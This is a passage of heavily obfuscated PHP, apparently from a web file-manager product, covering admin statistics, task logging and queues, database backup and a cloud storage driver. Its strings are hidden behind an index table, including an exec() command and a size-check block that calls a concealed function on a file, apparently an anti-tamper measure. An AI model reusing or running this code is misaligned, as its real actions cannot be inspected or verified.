} sort($ÎÁµ·Î‹); return $ÎÁµ·Î‹; } public function listTable($½€’¬±÷) { $×œş¨úë = ucfirst($½€’¬±÷); return Model($×œş¨úë)->listData(); } public function option($¥›È¤ıÙ) { $‚†©“ñå = $_SERVER[ĞÂ¤àÓï][1813] . ucfirst($¥›È¤ıÙ); return $this->{$‚†©“ñå}(); } private function optionUser() { $÷øŠïƒâ =& $_SERVER[ĞÂ¤àÓï]; $¸”Ïï’é = Model($÷øŠïƒâ[535])->count($÷øŠïƒâ[1664]); $òî³²Áİ = Model($÷øŠïƒâ[535])->where($÷øŠïƒâ[1814])->count($÷øŠïƒâ[1664]); $ú Ù¶” = intval($GLOBALS[$÷øŠïƒâ[6]][$÷øŠïƒâ[349]][$÷øŠïƒâ[1619]]) / 3600; $†¶ ’Ö¶ = strtotime("\55{$ú Ù¶”}\x20\150\x6f\165\162\163"); $ÊÑØ¯ƒ¥ = strtotime(date($÷øŠïƒâ[1795])); if ($†¶ ’Ö¶ < $ÊÑØ¯ƒ¥) { $†¶ ’Ö¶ = $ÊÑØ¯ƒ¥; } $ãŒ¡°áĞ = array($÷øŠïƒâ[1815] => array($÷øŠïƒâ[1014], $†¶ ’Ö¶)); $ÅÃÕí™á = (int) Model($÷øŠïƒâ[535])->where($ãŒ¡°áĞ)->count($÷øŠïƒâ[1664]); if (!$ÅÃÕí™á) { $ÅÃÕí™á = 1; } $ãŒ¡°áĞ = array($÷øŠïƒâ[1815] => array($÷øŠïƒâ[1014], $ÊÑØ¯ƒ¥)); $ğñß É = Model($÷øŠïƒâ[535])->where($ãŒ¡°áĞ)->count($÷øŠïƒâ[1664]); return array($÷øŠïƒâ[758] => (int) $¸”Ïï’é, $÷øŠïƒâ[1816] => (int) ($¸”Ïï’é - $òî³²Áİ), $÷øŠïƒâ[1817] => (int) $òî³²Áİ, $÷øŠïƒâ[1818] => (int) $ğñß É, $÷øŠïƒâ[1819] => $ÅÃÕí™á); } private function optionFile() { $¸ÉĞ±¸ =& $_SERVER[ĞÂ¤àÓï]; $ÈÃ­“Ãè = $this->sourceSize(); $›ûÇû¿ = $ÈÃ­“Ãè[$¸ÉĞ±¸[76]]; $¥ƒÛÍ¦÷ = $ÈÃ­“Ãè[$¸ÉĞ±¸[1788]]; $æÇâ”× = Model($¸ÉĞ±¸[832])->where(array($¸ÉĞ±¸[410] => 0))->count($¸ÉĞ±¸[402]); $ãÍâõ¢ = array($¸ÉĞ±¸[410] => 0, $¸ÉĞ±¸[200] => array($¸ÉĞ±¸[1014], strtotime(date($¸ÉĞ±¸[1795])))); $è´À…› = Model($¸ÉĞ±¸[832])->where($ãÍâõ¢)->sum($¸ÉĞ±¸[76]); $Å£áºö® = Model($¸ÉĞ±¸[832])->where($ãÍâõ¢)->count($¸ÉĞ±¸[402]); return array($¸ÉĞ±¸[762] => $›ûÇû¿, $¸ÉĞ±¸[1788] => $¥ƒÛÍ¦÷, $¸ÉĞ±¸[1820] => $›ûÇû¿ - $¥ƒÛÍ¦÷, $¸ÉĞ±¸[1821] => (int) $è´À…›, $¸ÉĞ±¸[764] => (int) $æÇâ”×, $¸ÉĞ±¸[1822] => (int) $Å£áºö®); } private function optionAccess() { $Üô¦Û©ç =& $_SERVER[ĞÂ¤àÓï]; return array($Üô¦Û©ç[758] => $this->typeLogCnt(), $Üô¦Û©ç[107] => $this->typeLogCnt($Üô¦Û©ç[107]), $Üô¦Û©ç[452] => $this->typeLogCnt($Üô¦Û©ç[452]), $Üô¦Û©ç[1823] => $this->typeLogCnt($Üô¦Û©ç[1823]), $Üô¦Û©ç[1824] => $this->typeLogCnt($Üô¦Û©ç[1824]), $Üô¦Û©ç[600] => $this->typeLogCnt($Üô¦Û©ç[12], $Üô¦Û©ç[1799])); } private function typeLogCnt($ÕÈ£Îµ = '', $ÔÇÉìª¨ = "\151\x64") { $ıøÖ´¬© =& $_SERVER[ĞÂ¤àÓï]; $ÈÚóÊä = array($ıøÖ´¬©[107] => array($ıøÖ´¬©[1825], $ıøÖ´¬©[1826]), $ıøÖ´¬©[452] => array($ıøÖ´¬©[1827], $ıøÖ´¬©[1828]), $ıøÖ´¬©[1823] => array($ıøÖ´¬©[1829], $ıøÖ´¬©[1830], $ıøÖ´¬©[1831]), $ıøÖ´¬©[1824] => array($ıøÖ´¬©[1832], $ıøÖ´¬©[1833]), $ıøÖ´¬©[1834] => array($ıøÖ´¬©[1835], $ıøÖ´¬©[1836], $ıøÖ´¬©[1837])); $ûŒ×úšˆ = strtotime(date($ıøÖ´¬©[1795])); $©½ºËÍì = array($ıøÖ´¬©[200] => array($ıøÖ´¬©[1014], $ûŒ×úšˆ)); if ($ÕÈ£Îµ) { $©½ºËÍì[$ıøÖ´¬©[33]] = array($ıøÖ´¬©[7], $ÈÚóÊä[$ÕÈ£Îµ]); } $µÂûª’ = Model($ıøÖ´¬©[1798])->where($©½ºËÍì)->count($ÔÇÉìª¨); return (int) $µÂûª’; } private function optionServer() { $ê·şÄê =& $_SERVER[ĞÂ¤àÓï]; $ƒÚ‹ÑÅº = $this->diskDriver(); $ì°şÊåŸ = KodIO::defaultDriver(); $Ï×øËÑ™ = array($ê·şÄê[824] => $ì°şÊåŸ[$ê·şÄê[399]]); $Œ»×Çãå = Model($ê·şÄê[471])->where($Ï×øËÑ™)->sum($ê·şÄê[76]); $Œ§¢íçû = explode($ê·şÄê[53], $_SERVER[$ê·şÄê[143]]); $‘‘‘¶¹¦ = $Œ§¢íçû[0]; $“Ï„àÊ = $GLOBALS[$ê·şÄê[6]][$ê·şÄê[21]]; $Å±™‚¥Õ = $“Ï„àÊ[$ê·şÄê[976]]; if ($Å±™‚¥Õ == $ê·şÄê[964]) { $×æşøö² = explode($ê·şÄê[1280], $“Ï„àÊ[$ê·şÄê[975]]); $Å±™‚¥Õ = $×æşøö²[0]; } if ($Å±™‚¥Õ == $ê·şÄê[912] || $Å±™‚¥Õ == $ê·şÄê[811]) { $ÀçÄö»ç = Model()->db()->query($ê·şÄê[1838]); $ ¿Ù”à© = $ÀçÄö»ç[0] && isset($ÀçÄö»ç[0][$ê·şÄê[1563]]) ? $ÀçÄö»ç[0][$ê·şÄê[1563]] : 0; $Å±™‚¥Õ = $ê·şÄê[1839] . ($ ¿Ù”à© ? $ê·şÄê[8] . $ ¿Ù”à© : $ê·şÄê[12]); } $ÙåÊîòÛ = $GLOBALS[$ê·şÄê[6]][$ê·şÄê[349]][$ê·şÄê[834]]; return array($ê·şÄê[1840] => $ƒÚ‹ÑÅº ? $ƒÚ‹ÑÅº[$ê·şÄê[1841]] : 0, $ê·şÄê[1842] => $ƒÚ‹ÑÅº ? $ƒÚ‹ÑÅº[$ê·şÄê[1843]] : 0, $ê·şÄê[1844] => (int) $ì°şÊåŸ[$ê·şÄê[1841]] * 1024 * 1024 * 1024, $ê·şÄê[1845] => (int) $Œ»×Çãå, $ê·şÄê[1846] => ucfirst($‘‘‘¶¹¦), $ê·şÄê[1847] => $ê·şÄê[1848] . PHP_VERSION, $ê·şÄê[1849] => phpBuild64() ? 64 : 32, $ê·şÄê[757] => str_replace($ê·şÄê[1130], $ê·şÄê[992], $Å±™‚¥Õ), $ê·şÄê[349] => ucfirst($ÙåÊîòÛ), $ê·şÄê[32] => $_SERVER[$ê·şÄê[1850]]); } private function diskDriver() { $šŒ…şŞ“ =& $_SERVER[ĞÂ¤àÓï]; $Àº¦‰²ä = $šŒ…şŞ“[8]; $ê­Û¥õ = $GLOBALS[$šŒ…şŞ“[6]][$šŒ…şŞ“[1297]] == $šŒ…şŞ“[1298]; if ($ê­Û¥õ) { $Àº¦‰²ä = $šŒ…şŞ“[1851]; if (function_exists($šŒ…şŞ“[1852])) { exec($šŒ…şŞ“[1853], $úãæŠ¯¡); $Àº¦‰²ä = $úãæŠ¯¡[1] . $šŒ…şŞ“[8]; } } if (!file_exists($Àº¦‰²ä)) { return; } $ÄÜõ•º = @disk_total_space($Àº¦‰²ä); $ıÎÂæ† = $ÄÜõ•º - @disk_free_space($Àº¦‰²ä); return array($šŒ…şŞ“[1841] => $ÄÜõ•º, $šŒ…şŞ“[1843] => $ıÎÂæ†); } public function fileChart($ãøÏÃ¡») { $şå¶ß =& $_SERVER[ĞÂ¤àÓï]; if (isset($ãøÏÃ¡»[$şå¶ß[1664]])) { return Model($şå¶ß[832])->userFileTypeProfile($ãøÏÃ¡»[$şå¶ß[1664]]); } if (isset($ãøÏÃ¡»[$şå¶ß[1854]])) { return Model($şå¶ß[832])->groupFileTypeProfile($ãøÏÃ¡»[$şå¶ß[1854]]); } $¡Ó½åå = $this->sourceSize(); $ÖÖï¯ê¬ = array($şå¶ß[432] => 0, $şå¶ß[411] => 1); $‚“øõİ = Model($şå¶ß[832])->where($ÖÖï¯ê¬)->sum($şå¶ß[76]); $ÖÖï¯ê¬[$şå¶ß[411]] = 2; $³ªğŞÁ = Model($şå¶ß[832])->where($ÖÖï¯ê¬)->sum($şå¶ß[76]); return array($şå¶ß[762] => $¡Ó½åå[$şå¶ß[76]], $şå¶ß[1788] => $¡Ó½åå[$şå¶ß[1788]], $şå¶ß[1789] => (int) $‚“øõİ, $şå¶ß[1790] => (int) $³ªğŞÁ); } private function sourceSize() { $»õßªÜ =& $_SERVER[ĞÂ¤àÓï]; $¥Ê¶•¥Ÿ = Model($»õßªÜ[832])->where(array($»õßªÜ[410] => 0))->sum($»õßªÜ[76]); $½¬Âä…ñ = Model($»õßªÜ[471])->sum($»õßªÜ[76]); if ($½¬Âä…ñ > $¥Ê¶•¥Ÿ) { $½¬Âä…ñ = $¥Ê¶•¥Ÿ; } return array($»õßªÜ[76] => (int) $¥Ê¶•¥Ÿ, $»õßªÜ[1788] => (int) $½¬Âä…ñ); } } goto A¨†ˆíÕÓÖ; C—Ó¯×çÆ¨: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¿…Ù¦ªı, $ĞŸƒı´€ = '', $Æüª‚’É = 0, $³š©– = '') { $¦ŒûÔú° =& $_SERVER[ĞÂ¤àÓï]; $„ĞÍç£ = new Task($¿…Ù¦ªı, $ĞŸƒı´€, $Æüª‚’É, $³š©–); $GLOBALS[$¦ŒûÔú°[1748] . $¿…Ù¦ªı] = new TaskLog($¦ŒûÔú°[1648], $„ĞÍç£, $³š©–); return $„ĞÍç£; } public function __construct($úá«Ÿ = '', $î»î¦ÈÌ = '', $íƒÕÃí = '') { $¸ß =& $_SERVER[ĞÂ¤àÓï]; if (!$úá«Ÿ) { $úá«Ÿ = $¸ß[1648]; } $Îùêİœğ = $úá«Ÿ . $¸ß[386] . rand_string(10); if (!$íƒÕÃí) { $íƒÕÃí = $úá«Ÿ . $¸ß[53] . $íƒÕÃí; } switch ($úá«Ÿ) { case $¸ß[1648]: if (!$î»î¦ÈÌ || !$î»î¦ÈÌ->task) { return echoLog($úá«Ÿ . $¸ß[1749]); } $øÉ‡ºó = $î»î¦ÈÌ; $Îùêİœğ = $øÉ‡ºó->task[$¸ß[399]]; $úá«Ÿ = $øÉ‡ºó->task[$¸ß[399]]; if (!$øÉ‡ºó->task[$¸ß[1564]]) { $øÉ‡ºó->task[$¸ß[1564]] = $íƒÕÃí ? $íƒÕÃí : $úá«Ÿ; } break; case $¸ß[1750]: if (!$î»î¦ÈÌ) { return echoLog($úá«Ÿ . $¸ß[1751]); } $¡Ø‡è˜Á = is_string($î»î¦ÈÌ) ? array($î»î¦ÈÌ) : $î»î¦ÈÌ; $øÉ‡ºó = new TaskFileTransfer($Îùêİœğ, $úá«Ÿ, 0, $íƒÕÃí ? $íƒÕÃí : $¡Ø‡è˜Á[0]); foreach ($¡Ø‡è˜Á as $â•±Æı) { $øÉ‡ºó->addPath($â•±Æı); } break; case $¸ß[313]: if (!$î»î¦ÈÌ) { return echoLog($úá«Ÿ . $¸ß[1751]); } $¡Ø‡è˜Á = is_string($î»î¦ÈÌ) ? array($î»î¦ÈÌ) : $î»î¦ÈÌ; $øÉ‡ºó = new TaskZip($Îùêİœğ, $úá«Ÿ, 0, $íƒÕÃí ? $íƒÕÃí : $¡Ø‡è˜Á[0]); foreach ($¡Ø‡è˜Á as $â•±Æı) { $øÉ‡ºó->addPath($â•±Æı); } break; case $¸ß[1215]: if (!$î»î¦ÈÌ) { return echoLog($úá«Ÿ . $¸ß[1751]); } $øÉ‡ºó = new TaskUnZip($Îùêİœğ, $úá«Ÿ, 0, $íƒÕÃí ? $íƒÕÃí : $î»î¦ÈÌ); if ($î»î¦ÈÌ) { $øÉ‡ºó->addFile($î»î¦ÈÌ); } break; case $¸ß[148]: $øÉ‡ºó = new TaskHttp($Îùêİœğ, $úá«Ÿ); break; default: return; break; } $this->task = $øÉ‡ºó; $this->taskID = $Îùêİœğ; Hook::bind($¸ß[1686], array($this, $¸ß[1752])); Hook::bind($¸ß[1688], array($this, $¸ß[1753])); Hook::bind($¸ß[1682], array($this, $¸ß[1754])); echoLog($¸ß[1755] . $øÉ‡ºó->task[$¸ß[1564]]); } public function __destruct() { $this->end(); } public function end($‰íÜ˜ıÖ = '') { $ëŠ»é¥Ï =& $_SERVER[ĞÂ¤àÓï]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($‰íÜ˜ıÖ); $this->task = !1; $this->taskID = !1; Hook::unbind($ëŠ»é¥Ï[1686], array($this, $ëŠ»é¥Ï[1752])); Hook::unbind($ëŠ»é¥Ï[1688], array($this, $ëŠ»é¥Ï[1753])); Hook::unbind($ëŠ»é¥Ï[1682], array($this, $ëŠ»é¥Ï[1754])); } public function taskUpdate($­¡­•‰) { $Ş—şªıã =& $_SERVER[ĞÂ¤àÓï]; if (!$­¡­•‰ || $this->taskID != $­¡­•‰[$Ş—şªıã[399]]) { return; } $öÖèËç¤ = 20; $ê§˜è· = intval($­¡­•‰[$Ş—şªıã[1666]] * $öÖèËç¤); $û’ûüÈ’ = $Ş—şªıã[162] . str_repeat($Ş—şªıã[884], $ê§˜è·) . $Ş—şªıã[1014] . str_repeat($Ş—şªıã[53], $öÖèËç¤ - $ê§˜è·) . $Ş—şªıã[164]; $Ã¿Ş¹›µ = $û’ûüÈ’ . sprintf($Ş—şªıã[1756], $­¡­•‰[$Ş—şªıã[1666]] * 100) . $Ş—şªıã[1757]; $öØÎ¹¦¯ = $Ã¿Ş¹›µ . $­¡­•‰[$Ş—şªıã[1665]] . $Ş—şªıã[8] . $­¡­•‰[$Ş—şªıã[793]] . LNG($Ş—şªıã[1758]); $½²«•ƒ« = $Ş—şªıã[12]; if ($­¡­•‰[$Ş—şªıã[1742]]) { $öØÎ¹¦¯ = $Ã¿Ş¹›µ . size_format($­¡­•‰[$Ş—şªıã[1665]]) . $Ş—şªıã[8] . size_format($­¡­•‰[$Ş—şªıã[793]]); $½²«•ƒ« = size_format($­¡­•‰[$Ş—şªıã[1667]]) . $Ş—şªıã[1759]; } if ($­¡­•‰[$Ş—şªıã[1064]]) { $­¡­•‰[$Ş—şªıã[1716]] = $­¡­•‰[$Ş—şªıã[1064]] . $Ş—şªıã[53] . $­¡­•‰[$Ş—şªıã[1716]]; } if ($­¡­•‰[$Ş—şªıã[1716]]) { $ó°Ïö° = $Ş—şªıã[12]; if ($­¡­•‰[$Ş—şªıã[1718]]) { $ó°Ïö° = size_format($­¡­•‰[$Ş—şªıã[1719]]) . $Ş—şªıã[8] . size_format($­¡­•‰[$Ş—şªıã[1718]]); } $½²«•ƒ« .= $­¡­•‰[$Ş—şªıã[1716]] . $ó°Ïö°; } if ($­¡­•‰[$Ş—şªıã[762]]) { $½²«•ƒ« .= $Ş—şªıã[53] . size_format($­¡­•‰[$Ş—şªıã[1723]]) . $Ş—şªıã[8] . size_format($­¡­•‰[$Ş—şªıã[762]]); } echoLog($öØÎ¹¦¯ . $Ş—şªıã[53] . $½²«•ƒ«, !0); } public function taskEnd($Ã¸Ÿ¨Ñä) { $“«åàŒŸ =& $_SERVER[ĞÂ¤àÓï]; if (!$Ã¸Ÿ¨Ñä || $this->taskID != $Ã¸Ÿ¨Ñä[$“«åàŒŸ[399]]) { return; } $ËĞ¨ÃæÆ = $Ã¸Ÿ¨Ñä ? $Ã¸Ÿ¨Ñä[$“«åàŒŸ[1665]] . $“«åàŒŸ[8] . $Ã¸Ÿ¨Ñä[$“«åàŒŸ[793]] . LNG($“«åàŒŸ[1758]) . $“«åàŒŸ[71] : $“«åàŒŸ[12]; echoLog($“«åàŒŸ[1760] . $Ã¸Ÿ¨Ñä[$“«åàŒŸ[1564]] . ($Ã¸Ÿ¨Ñä[$“«åàŒŸ[453]] ? $“«åàŒŸ[71] . $Ã¸Ÿ¨Ñä[$“«åàŒŸ[453]] : $“«åàŒŸ[12]) . $“«åàŒŸ[71] . $ËĞ¨ÃæÆ . $“«åàŒŸ[1761] . sprintf($“«åàŒŸ[1680], timeFloat() - $Ã¸Ÿ¨Ñä[$“«åàŒŸ[1668]]) . $“«åàŒŸ[1681]); $this->end(); } public function taskKill($˜ªì±Ù) { $¬ÍÖŞ–É =& $_SERVER[ĞÂ¤àÓï]; if (!$˜ªì±Ù || $this->taskID != $˜ªì±Ù[$¬ÍÖŞ–É[399]]) { return; } echoLog($¬ÍÖŞ–É[1762] . $˜ªì±Ù[$¬ÍÖŞ–É[1564]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\121\x75\145\x75\x65\114\145\x6e\147\x74\x68"; const QUEUE_DATA = "\164\141\x73\153\121\x75\x65\x75\145\104\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($¬Ú£½, $¥ÓŒÖÃÊ = array(), $ç‰Õ¡Ÿ¥ = '', $™È ş¤¼ = '') { $çÉ…šÜÃ =& $_SERVER[ĞÂ¤àÓï]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($™È ş¤¼ && array_find_by_field(self::$listData, $çÉ…šÜÃ[94], $™È ş¤¼)) { return !0; } self::$listData[] = array($çÉ…šÜÃ[264] => $¬Ú£½, $çÉ…šÜÃ[1763] => $¥ÓŒÖÃÊ, $çÉ…šÜÃ[453] => $ç‰Õ¡Ÿ¥, $çÉ…šÜÃ[94] => $™È ş¤¼); return !0; } public static function addSubmit() { $³¾ê¨İ³ =& $_SERVER[ĞÂ¤àÓï]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($³¾ê¨İ³[1764] . json_encode_force(array_to_keyvalue(self::$listData, $³¾ê¨İ³[12], $³¾ê¨İ³[453])), $³¾ê¨İ³[1765]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ŞÖ–û÷, $‡Úæ¦÷£ = array(), $È»²Ü©Ô = '', $¶ÃÆƒ­¢ = '') { $ÜãäÕ×í =& $_SERVER[ĞÂ¤àÓï]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Ç¼ª¤ÀÔ = self::getAll(); if ($¶ÃÆƒ­¢ && array_find_by_field($Ç¼ª¤ÀÔ, $ÜãäÕ×í[94], $¶ÃÆƒ­¢)) { return !0; } $Ç¼ª¤ÀÔ[] = array($ÜãäÕ×í[264] => $ŞÖ–û÷, $ÜãäÕ×í[1763] => $‡Úæ¦÷£, $ÜãäÕ×í[453] => $È»²Ü©Ô, $ÜãäÕ×í[94] => $¶ÃÆƒ­¢); write_log($ÜãäÕ×í[1764] . $È»²Ü©Ô, $ÜãäÕ×í[1765]); self::setAll($Ç¼ª¤ÀÔ); return !0; } public static function run() { $¹š€¯Ö£ =& $_SERVER[ĞÂ¤àÓï]; $‡²•ï–” = self::getAll(); $ÆŞõÊ“Ï = array_shift($‡²•ï–”); if (!$ÆŞõÊ“Ï) { return !1; } self::setAll($‡²•ï–”); $—Ü¬™¢÷ = timeFloat(); try { Hook::apply($ÆŞõÊ“Ï[$¹š€¯Ö£[264]], $ÆŞõÊ“Ï[$¹š€¯Ö£[1763]]); } catch (Exception $†Š¯ôÎØ) { } $şÙˆŸåö = number_format(timeFloat() - $—Ü¬™¢÷, 3) . $¹š€¯Ö£[1681]; write_log($¹š€¯Ö£[1766] . $ÆŞõÊ“Ï[$¹š€¯Ö£[453]] . $¹š€¯Ö£[1767] . $şÙˆŸåö, $¹š€¯Ö£[1765]); return !0; } public static function count() { $ÙñÈ»Çõ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$ÙñÈ»Çõ) { return 0; } return intval($ÙñÈ»Çõ); } public static function getAll() { $Õ‡×Ò ß = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$Õ‡×Ò ß) { return array(); } return $Õ‡×Ò ß; } public static function setAll($ÒÎáÊ©é) { $¶µ¥ÕÔ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ÒÎáÊ©é), $¶µ¥ÕÔ); Cache::set(self::QUEUE_DATA, $ÒÎáÊ©é, $¶µ¥ÕÔ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ñäŸ¨ØÈ, $«¹¤º® = 5.0) { if (!$ñäŸ¨ØÈ) { return; } $øô£Ãî = Cache::get($ñäŸ¨ØÈ); if (!$øô£Ãî || timeFloat() - floatVal($øô£Ãî) >= $«¹¤º®) { Cache::set($ñäŸ¨ØÈ, timeFloat(), $«¹¤º® * 10); return !0; } return !1; } public static function timeLimitCall($˜·±Êî, $Ì¾çÁë­, $ß•ØÚäÍ, $ûáÔıÉ = 5.0) { $¾æÒ§¨­ =& $_SERVER[ĞÂ¤àÓï]; if (!$˜·±Êî || !$Ì¾çÁë­) { return; } self::$asyncAdd = !0; $µÎâğ˜ä = $¾æÒ§¨­[1768]; $”ˆæë = Cache::get($µÎâğ˜ä, !0); $Î×Ã™îö = array($¾æÒ§¨­[1769] => timeFloat(), $¾æÒ§¨­[1770] => timeFloat(), $¾æÒ§¨­[264] => $Ì¾çÁë­, $¾æÒ§¨­[1763] => $ß•ØÚäÍ, $¾æÒ§¨­[203] => $ûáÔıÉ); if (is_array($”ˆæë[$˜·±Êî])) { $Î×Ã™îö[$¾æÒ§¨­[1770]] = $”ˆæë[$˜·±Êî][$¾æÒ§¨­[1770]]; } if (is_array($”ˆæë[$˜·±Êî])) { if (timeFloat() - $”ˆæë[$˜·±Êî][$¾æÒ§¨­[1769]] < $Î×Ã™îö[$¾æÒ§¨­[203]] * 0.3) { return; } $Î×Ã™îö[$¾æÒ§¨­[1770]] = $”ˆæë[$˜·±Êî][$¾æÒ§¨­[1770]]; } $”ˆæë[$˜·±Êî] = $Î×Ã™îö; Cache::set($µÎâğ˜ä, $”ˆæë, 60); Cache::removeMemory($µÎâğ˜ä); write_log($¾æÒ§¨­[1771] . $˜·±Êî . $¾æÒ§¨­[71] . $Ì¾çÁë­, $¾æÒ§¨­[1765]); } public static function timeLimitCallLoop() { $›ÒÁú€Õ =& $_SERVER[ĞÂ¤àÓï]; $º½ ç¿¿ = array($›ÒÁú€Õ[1772]); $½Í´ëù’ = in_array(strtolower(ACTION), $º½ ç¿¿); if (!$½Í´ëù’ && !self::$asyncAdd) { return; } $ÓÎ­ší = $›ÒÁú€Õ[1768]; $‡©ø÷’— = Cache::get($ÓÎ­ší, !0); if (!$‡©ø÷’— || count($‡©ø÷’—) <= 0) { return; } $÷«¿…àô = !1; $›èş °Ü = timeFloat(); $†ÁôÓ¯‰ = array(); foreach ($‡©ø÷’— as $şêŸĞÊè => $ïú±î¯ç) { if ($›èş °Ü - $ïú±î¯ç[$›ÒÁú€Õ[1770]] > $ïú±î¯ç[$›ÒÁú€Õ[203]]) { $÷«¿…àô = !0; try { Hook::apply($ïú±î¯ç[$›ÒÁú€Õ[264]], $ïú±î¯ç[$›ÒÁú€Õ[1763]]); write_log($›ÒÁú€Õ[1773] . $şêŸĞÊè . $›ÒÁú€Õ[71] . $ïú±î¯ç[$›ÒÁú€Õ[264]] . $›ÒÁú€Õ[1774] . ACTION, $›ÒÁú€Õ[1765]); } catch (Exception $ªşÁ¢¤Ü) { } continue; } $†ÁôÓ¯‰[$şêŸĞÊè] = $ïú±î¯ç; } if (!$÷«¿…àô) { return; } if (!$†ÁôÓ¯‰) { return Cache::remove($ÓÎ­ší); } Cache::set($ÓÎ­ší, $†ÁôÓ¯‰, 60); Cache::removeMemory($ÓÎ­ší); } public static function finished($äÌ £ãä, $¬ãÑñĞÖ) { $¼ºÄÁ¶— =& $_SERVER[ĞÂ¤àÓï]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¼ºÄÁ¶—[264] => $äÌ £ãä, $¼ºÄÁ¶—[1763] => $¬ãÑñĞÖ); } private static function finishedRun() { $Ì˜¶à =& $_SERVER[ĞÂ¤àÓï]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ñ›¯õ‘°) { try { Hook::apply($ñ›¯õ‘°[$Ì˜¶à[264]], $ñ›¯õ‘°[$Ì˜¶à[1763]]); } catch (Exception $éÙØ»Ó›) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto CÏ–¥ŠÌ‘î; aØİâ¿À¼î: $_size = $_SERVER[ĞÂ¤àÓï][776]; if ($_SERVER[$_SERVER[ĞÂ¤àÓï][777]] != $_size($_file)) { $_getc = $_SERVER[ĞÂ¤àÓï][778]; $_getfile = $_SERVER[$_SERVER[ĞÂ¤àÓï][779]] . $_SERVER[ĞÂ¤àÓï][780]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ĞÂ¤àÓï][231], $_getfilec); if (count($_getarrs) < $_SERVER[ĞÂ¤àÓï][630]) { $exit = $_SERVER[ĞÂ¤àÓï][781]; $exit(); } $_act = $_SERVER[ĞÂ¤àÓï][782]; $_act($_file); } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $É”¡é¨å =& $_SERVER[ĞÂ¤àÓï]; $³ŒŠäõ¨ = Backup::get(); self::$io = $³ŒŠäõ¨[$É”¡é¨å[751]]; self::$name = $³ŒŠäõ¨[$É”¡é¨å[32]]; $ô«ÎûªÖ = new DbManage(); $ã¤§ÈÁ = $ô«ÎûªÖ->dbType(); $ã¤ÜáÜ = array($É”¡é¨å[783] => $ã¤§ÈÁ, $É”¡é¨å[784] => time()); Backup::set($ã¤ÜáÜ); $ÉÛùø™ = $this->tmpFilesPath() . $É”¡é¨å[785] . self::$name . $É”¡é¨å[8]; del_dir($ÉÛùø™); mk_dir($ÉÛùø™); $œ¼û¾¹ = $®‡Ï× = 0; $Ö–•›ØË = new Task($É”¡é¨å[786], $É”¡é¨å[787], 0, LNG($É”¡é¨å[788]) . $É”¡é¨å[789] . LNG($É”¡é¨å[790])); try { $˜â€†ıË = $ô«ÎûªÖ->db()->getTables(); } catch (Exception $¥©ãÙÈÆ) { $Ö–•›ØË->end(); return !1; } $˜â€†ıË = array_diff($˜â€†ıË, array($É”¡é¨å[791], $É”¡é¨å[792])); foreach ($˜â€†ıË as $Œ–šÚĞ…) { $œ¼û¾¹ += $ô«ÎûªÖ->model($Œ–šÚĞ…)->count(); } $Ö–•›ØË->task[$É”¡é¨å[793]] = $œ¼û¾¹; $GLOBALS[$É”¡é¨å[794]] = self::$name; foreach ($˜â€†ıË as $Œ–šÚĞ…) { $†Â›‚˜ = $ÉÛùø™ . $Œ–šÚĞ… . $É”¡é¨å[795]; $éÅÇ¼ë = null; if ($Œ–šÚĞ… == $É”¡é¨å[796] && (!isset($³ŒŠäõ¨[$É”¡é¨å[754]]) || $³ŒŠäõ¨[$É”¡é¨å[754]] == $É”¡é¨å[197])) { $éÅÇ¼ë = self::$io; } $®‡Ï× += $ô«ÎûªÖ->sqlFromDb($Œ–šÚĞ…, $†Â›‚˜, $Ö–•›ØË, $éÅÇ¼ë); } unset($GLOBALS[$É”¡é¨å[794]]); $Ö–•›ØË->end(); if ($®‡Ï× > $œ¼û¾¹) { $œ¼û¾¹ = $®‡Ï×; } $ã¤ÜáÜ = array($É”¡é¨å[783] => $ã¤§ÈÁ, $É”¡é¨å[772] => 1, $É”¡é¨å[797] => $œ¼û¾¹, $É”¡é¨å[798] => $®‡Ï×, $É”¡é¨å[799] => time()); Backup::set($ã¤ÜáÜ); if ($œ¼û¾¹ - $®‡Ï× > 0) { $áÊïôÏŞ = $É”¡é¨å[800]; if (stristr(I18n::getType(), $É”¡é¨å[801])) { $áÊïôÏŞ = $É”¡é¨å[802]; } write_log(array($áÊïôÏŞ, $ã¤ÜáÜ), $É”¡é¨å[787]); return !1; } return !0; } private function tmpFilesPath() { $¢¼ƒßÖ¦ =& $_SERVER[ĞÂ¤àÓï]; $ÑË®¨¦ = TEMP_FILES; if ($GLOBALS[$¢¼ƒßÖ¦[6]][$¢¼ƒßÖ¦[89]][$¢¼ƒßÖ¦[803]]) { $ÑË®¨¦ = $GLOBALS[$¢¼ƒßÖ¦[6]][$¢¼ƒßÖ¦[89]][$¢¼ƒßÖ¦[803]]; if (!mk_dir($ÑË®¨¦) || !is_writable($ÑË®¨¦) || !IO::mkfile($ÑË®¨¦ . $¢¼ƒßÖ¦[804])) { $ÑË®¨¦ = TEMP_FILES; } } return $ÑË®¨¦; } } goto B´×Ÿ³ˆËÍ; E†ê—¯ÛŞˆ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Ü˜–ÓˆÉ) { parent::__construct($Ü˜–ÓˆÉ); $this->signatureVersion($_SERVER[ĞÂ¤àÓï][216]); } public function uploadFormData($¬‹Ç£Üº, $Ï®¿íú = 3600) { $üÆşœš» =& $_SERVER[ĞÂ¤àÓï]; $ù—„¾© = $üÆşœš»[198]; $À—Ü¸àò = $üÆşœš»[232]; $¿Ëããåú = 